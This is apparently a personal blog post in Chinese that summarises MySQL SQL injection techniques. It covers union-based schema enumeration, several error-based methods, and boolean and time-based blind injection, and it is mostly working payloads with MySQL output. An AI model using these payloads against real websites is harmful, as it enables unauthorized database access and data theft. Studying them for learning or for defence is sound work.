title: SQL注入相关语句归类总结
date: '2019-09-17 02:08:33'
updated: '2019-09-17 02:08:33'
tags: [SQL注入, Web安全]
permalink: /articles/2019/09/17/1575014357422.html
---
最近学习SQL注入，简单的做个总结。

<!-- more -->

# 0x01 简单注入

简单注入主要是`数字注入`跟`字符注入`，通过`union`、`select  * from table_name where 约束条件`等。在没有对参数做过滤限制的情况下进行SQL查询并直接显示在页面中。

常见的payload有：

```sql
# 获取当前的数据库用户，数据库名称，数据库的版本信息
select user(),database(),version() from table_name;
# 查询数据库，有时需要限制返回的数量，或者偏移，例如页面只显示一条数据的情况 limit 0,1 limit 1,2
# 需要通过偏移来返回所有的数据库
select schema_name from information_schema.schemata;
# group_concat 函数是将多行数据连接成一行
select group_concat(schema_name) from information_schema.schemata;
# 查询表
# 方法1
select group_concat(table_name) from information_schema.tables where table_schema=database();  
# 方法2
select table_name from information_schema.tables where table_schema='database_name';
# 方法3
select table_name from information_schema.tables where table_schema=(select database());

# 查询列
select column_name from information_schema.columns where table_schema='database_name' and table_name='users';
select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='flag';

# 上面可能会被waf识别，也可以这样
select group_concat(column_name) from information_schema.columns where table_name='users';

# 字符串可以转换成16进制
select concat(group_concat(distinct+column_name)) from information_schema.columns where table_name=0x696e666f;

```

# 0x02 报错注入

## 2.1 Xpath报错

这里用到`ExtractValue`和`UpdateXML`这两个函数。

###  2.1.1 ExtractValue()

官方文档定义:

```sql
ExtractValue(xml_frag, xpath_expr)
xml_frag - XML 语言片段
xpath_expr - XPath 语言表达式
......
It returns the text (CDATA) of the first text node which is a child of the elements or elements matched by the XPath expression.
```

这个函数的作用是返回与`Xpath`表达式匹配元素的第一个子`text`节点的内容，返回值和参数均为字符串

```sql
mysql> select ExtractValue('<a><b>X</b><b>Y</b></a>','//a/b[1]');
+----------------------------------------------------+
| ExtractValue('<a><b>X</b><b>Y</b></a>','//a/b[1]') |
+----------------------------------------------------+
| X                                                  |
+----------------------------------------------------+
1 row in set (0.00 sec)

mysql> select ExtractValue('<a><b>X</b><b>Y</b></a>','//a/b');
+-------------------------------------------------+
| ExtractValue('<a><b>X</b><b>Y</b></a>','//a/b') |
+-------------------------------------------------+
| X Y                                             |
+-------------------------------------------------+
1 row in set (0.00 sec)
```

这里`//a/b[1]`是匹配查询到的第一个符合元素的第一个子`text`节点内容。而`//a/b`匹配多个符合的元素并返回所有匹配元素的第一个子`text`节点的内容，以空格隔开。

```sql
mysql> select ExtractValue('<a><b>X</b><b><c>Z</c></b></a>','//a/b');
+--------------------------------------------------------+
| ExtractValue('<a><b>X</b><b><c>Z</c></b></a>','//a/b') |
+--------------------------------------------------------+
| X                                                      |
+--------------------------------------------------------+
1 row in set (0.00 sec)
```

如果匹配不到任何XML的元素，`XPath`格式正确返回空字符串，而要是不正确就会报出`XPath语法`错误。

```sql
mysql> select ExtractValue('<a><b>X</b><b>Y</b></a>','?');
ERROR 1105 (HY000): XPATH syntax error: '?'
```

最重要的是它会执行`Mysql`函数：

```sql
mysql> select ExtractValue('<a><b>X</b><b>Y</b></a>',concat('?',user()));
ERROR 1105 (HY000): XPATH syntax error: '?root@localhost'
```

`MySQL `对我们传进去的 `XPath` 表达式先进行了求值，然后判断这不是一个合法的 `XPath` 表达式(因为有特殊符号`?`的存在)，最后爆出了 `XPath `语法错误。

所以我们就可以利用这个函数进行显错注入了，比如这里有个 `id` 参数可以注入

```
?id=1' and ExtractValue(1,concat('?', (select table_name from information_schema.tables)))%23
```

### 2.1.2 UpdateXML()

与`ExtractValue`函数的利用原理相同，首先看一下官方文档的函数定义：

```
UpdateXML(xml_target, xpath_expr, new_xml)
xml_target - XML 语言片段
xpath_expr - XPath 语言表达式
new_xml - 用于替换的 XML 片段
```

作用是找到匹配元素的第一个`text`节点，然后用`new_xml`替换：

```sql
mysql> select UpdateXML('<a><b>X</b><b>Y</b></a>','//a/b[1]','hacked');
+----------------------------------------------------------+
| UpdateXML('<a><b>X</b><b>Y</b></a>','//a/b[1]','hacked') |
+----------------------------------------------------------+
| <a>hacked<b>Y</b></a>                                    |
+----------------------------------------------------------+
1 row in set (0.00 sec)
```

利用方式和`ExtractValue`一样，都是在`XPath`上做文章：

```
mysql> select UpdateXML('<a><b>X</b><b>Y</b></a>',concat('?',user(),'-',version()),'hacked');
ERROR 1105 (HY000): XPATH syntax error: '?root@localhost-5.7.27-0ubuntu0.'
```

<font color="red">注意：</font>此函数只能爆出<font color="red">32位</font>的数据，所以可以结合`mid`来使用。


## 2.2 基于rand()与group by报错注入

查看`group by`官方文档可以看到：

> RAND() in a WHERE clause is re-evaluated every time the WHERE is executed.
Use of a column with RAND() values in an ORDER BY or GROUP BY clause may yield unexpected results because for either clause a RAND() expression can be evaluated multiple times for the same row, each time returning a different result.


在`order by`或者`group by`子句中不能使用`rand()`函数，否则会报错。

基础语法为：

`select count(*) from table_name group by floor(rand(0)*2);`

准确的说是`count(*)`、`rand()`、`group by`三者<font color="red">不能同时使用</font>

首先`rand()` 函数返回 0 到 1 之间的浮点数，如果给定常数`N`，即`rand(N)`，N 将会被用作种子值，并产生可重复的值的序列

所以`floor(rand(0)*2)`会产生有规律的随机数

```sql
mysql> select floor(rand(0)*2) from test1;
+------------------+
| floor(rand(0)*2) |
+------------------+
|                0 |
|                1 |
|                1 |
|                0 |
|                1 |
|                1 |
+------------------+
6 rows in set (0.00 sec)
```

而`floor(rand(0)*2)` 的报错是被它多次计算所导致的

1. 查询前默认会建立空虚拟表。

2. 取第一条记录，执行`floor(rand(0)*2)`，发现结果为0(第一次计算),查询虚拟表，发现0的键值不存在，则`floor(rand(0)*2)`会被再计算一次，结果为1(第二次计算)，插入虚表，这时第一条记录查询完毕。

3. 查询第二条记录，再次计算`floor(rand(0)*2)`，发现结果为1(第三次计算)，查询虚表，发现1的键值存在，所以`floor(rand(0)*2)`不会被计算第二次，直接`count(*)`加1，第二条记录查询完毕。

4. 查询第三条记录，再次计算`floor(rand(0)*2)`，发现结果为0(第4次计算)，查询虚表，发现键值没有0，则数据库尝试插入一条新的数据，在插入数据时`floor(rand(0)*2)`被再次计算，作为虚表的主键，其值为1(第5次计算)，然而1这个主键已经存在于虚拟表中，而新计算的值也为1(主键键值必须唯一)，所以插入的时候就直接报错了。

5. 整个查询过程`floor(rand(0)*2)`被计算了5次，查询原数据表3次，所以这就是为什么数据表中需要3条数据，使用该语句才会报错的原因。

 了解了原理后我们可以构造报错语句了

```sql
mysql> select count(*),concat((select user()),floor(rand(0)*2))x from test1 group by x;
ERROR 1062 (23000): Duplicate entry 'root@localhost1' for key '<group_key>'
```

## 2.3 EXP()溢出报错

在`Mysql`版本大于`5.5.5`中，当`exp()`传入参数大于<font color="red">709</font>时就会引起溢出错误

```sql
select exp(~(select*from(select user())x));
```

## 2.4 NAME_CONST()重复列名报错

payload为：

```sql
mysql> select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1)) as x;
ERROR 1060 (42S21): Duplicate column name '5.7.27-0ubuntu0.19.04.1'
```

## 2.5 几何函数

分别有`geometrycollection()`、`multipoint()`、`polygon()`、`multipolygon()`、`linestring()`、`multilinestring()`等。

这些用法类似归结到一类，适用大于`Mysql 5.5.47`，不包括`5.7.17`。

payload为：

```sql
select linestring((select * from(select * from(select user())a)b));
```

## 2.6 using + join

适用于知道表名的情况下

payload为：

```sql
select * from (select * from 表名 a join 表名 b) c)  
在得到一个字段后，使用using得到下一个字段
select * from (select * from 表名 a join 表名 b using (已知的字段,已知的字段)) c  
```

例如：

```sql
mysql> select * from(select * from test1 as A join test1 as B using(id)) as C;
ERROR 1060 (42S21): Duplicate column name 'stu_name'
mysql> select * from(select * from test1 as A join test1 as B using(id, stu_name)) as C;
ERROR 1060 (42S21): Duplicate column name 'age'

```

# 0x03 盲注

## 3.1 布尔盲注

这种类型的注入我们要根据页面的变化来逐一猜解我们要的信息。猜解正常回显正常，反之错误。

主要用到如下几种判断函数

- `left(a, b)`：从左侧截取a的前b位
- `substr(a,b,c)`：从b的位置开始，截取字符串a的c长度。通常结合`ascii()`使用。
- `MID/ORD`：mid(a,b,c)同substr, ord()同ascii()
- `regexp` ：对`select`的结果进行正则判断，后面跟正则表达式。

例如：

```sql
mysql> select (ascii(substr((select user() limit 0,1),1,1)))=114;
+----------------------------------------------------+
| (ascii(substr((select user() limit 0,1),1,1)))=114 |
+----------------------------------------------------+
|                                                  1 |
+----------------------------------------------------+
1 row in set (0.00 sec)

mysql> select (ascii(substr((select user() limit 0,1),1,1)))=113;
+----------------------------------------------------+
| (ascii(substr((select user() limit 0,1),1,1)))=113 |
+----------------------------------------------------+
|                                                  0 |
+----------------------------------------------------+
1 row in set (0.00 sec)

mysql> select (ascii(mid((select user() limit 0,1),1,1)))=113;
+-------------------------------------------------+
| (ascii(mid((select user() limit 0,1),1,1)))=113 |
+-------------------------------------------------+
|                                               0 |
+-------------------------------------------------+
1 row in set (0.00 sec)

mysql> select (ascii(mid((select user() limit 0,1),1,1)))=114;
+-------------------------------------------------+
| (ascii(mid((select user() limit 0,1),1,1)))=114 |
+-------------------------------------------------+
|                                               1 |
+-------------------------------------------------+
1 row in set (0.00 sec)
```

判断出`user()`的首字母为`r`。

```sql
mysql> select user() regexp '^r';
+--------------------+
| user() regexp '^r' |
+--------------------+
|                  1 |
+--------------------+
1 row in set (0.00 sec)

mysql> select user() regexp '^ro';
+---------------------+
| user() regexp '^ro' |
+---------------------+
|                   1 |
+---------------------+
1 row in set (0.00 sec)

mysql> select user() regexp '^roi';
+----------------------+
| user() regexp '^roi' |
+----------------------+
|                    0 |
+----------------------+
1 row in set (0.00 sec)

mysql> select user() regexp '^root';
+-----------------------+
| user() regexp '^root' |
+-----------------------+
|                     1 |
+-----------------------+
1 row in set (0.00 sec)
```

## 3.2 时间盲注

根据页面返回时间长短判断猜解是否正确。结合`if(condition,true,flase) / and 1=*`判断语句使用。

主要用到如下几种函数：

- `sleep(N)`： 可以让语句运行`N`秒，即页面延迟加载`N`秒。
- `if(a,b,c)`：如果a判断语句为true，返回b；否则返回c。
- `benchmark(count, expr)`：重复计算`expr`表达式`count`次。这个函数返回值始终为0，但可以根据客户端提示的执行时间来得到BENCHMARK总共执行的所消耗的时间。
- `get_lock(key, timeout)`：一个是key，就是根据这个参数进行加锁的，另一个是等待时间(s)。如果key是第一次加锁返回1，反之等待时间进行第二次加锁。<font color="red">利用条件比较苛刻，需要使用 mysql_pconnect函数来连接数据库</font>。
- `RLIKE`：用来进行正则匹配，所以通过`rpad`或`repeat`构造长字符串，加以计算量大的`pattern`，通过`repeat`的参数可以控制延时长短。其中`rpad(str1,length,str2)`： str1没有length长用str2填充；`repeat(str,count)` 返回str重复count次之后的str。
- `笛卡尔积`：将两张多数据表做笛卡尔积，然后用cout(*)进行计算，以达到延时效果。

### 3.2.1 benchmark()

```
mysql> select benchmark(1000000,MD5('hello world'));
+---------------------------------------+
| benchmark(1000000,MD5('hello world')) |
+---------------------------------------+
|                                     0 |
+---------------------------------------+
1 row in set (0.18 sec)

mysql> select benchmark(10000000,MD5('hello world'));
+----------------------------------------+
| benchmark(10000000,MD5('hello world')) |
+----------------------------------------+
|                                      0 |
+----------------------------------------+
1 row in set (1.79 sec)
```

当`count`=1000000时，语句执行了0.18s；增大10倍后，语句执行了1.79s。

常见的payload为：

```sql
?id=1’ and (select 1 from (select concat((ascii(substr((要执行的语句),1,1))=115),benchmark(50000000,encode(‘msg’,’key’)))x from information_schema.tables group by x)a)#

?id=1’ and if(ascii(substr((要执行的语句),1,1))=115,benchmark(50000000,encode(‘msg’,’key’)),1)#

?id=1’ union select (if(substring((要执行的语句),1,1)=char(115),benchmark(50000000,encode(‘msg’,’key’)),1)),2,3#
```

### 3.2.2 get_lock()

![get_lock.png](https://i.loli.net/2019/09/15/m7dz8FZsay1Pkef.png)

需要在两个session分别进行，第二个session中可以看到语句执行了10s。

### 3.2.3 RLIKE

```sql
mysql> select rpad('a',4999999,'a') RLIKE concat(repeat('(a.*)+',30),'b');
+-------------------------------------------------------------+
| rpad('a',4999999,'a') RLIKE concat(repeat('(a.*)+',30),'b') |
+-------------------------------------------------------------+
|                                                           0 |
+-------------------------------------------------------------+
1 row in set (5.31 sec)

```

### 3.2.4 笛卡尔积

```sql
mysql> select count(*) from information_schema.columns A,information_schema.columns B;
+----------+
| count(*) |
+----------+
|  9504889 |
+----------+
1 row in set (0.57 sec)
```

可能我数据库内容太少了，但是三个表又太大了。



参考文献：

[SQL 盲注方法总结](https://blog.csdn.net/Kevinhanser/article/details/81592866)

[sql注入小结]([https://phyb0x.github.io/2018/12/11/sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E7%BB%93/](https://phyb0x.github.io/2018/12/11/sql注入小结/))

[几种常见的 MySQL 报错注入](http://heartsky.info/2016/12/04/几种常见的 MySQL 报错注入/)

[sql注入的一些技巧原理]([https://skysec.top/2017/07/19/sql%E6%B3%A8%E5%85%A5%E7%9A%84%E4%B8%80%E4%BA%9B%E6%8A%80%E5%B7%A7%E5%8E%9F%E7%90%86/](https://skysec.top/2017/07/19/sql注入的一些技巧原理/))